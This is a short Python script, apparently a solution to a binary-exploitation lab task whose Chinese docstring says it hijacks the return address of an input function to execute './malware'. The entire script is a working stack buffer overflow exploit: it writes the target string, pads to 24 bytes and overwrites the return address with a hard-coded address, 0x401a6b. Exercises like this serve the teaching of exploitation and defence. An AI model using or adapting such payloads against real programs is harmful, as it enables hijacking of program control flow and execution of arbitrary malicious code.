#!/usr/bin/env python3
"""Task 1: 劫持 input 的返回地址执行 ./malware。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)

payload  = b"./malware\x00"
payload += b"A" * (24 - len(payload))
payload += p64(0x401a6b)

sys.stdout.buffer.write(payload)
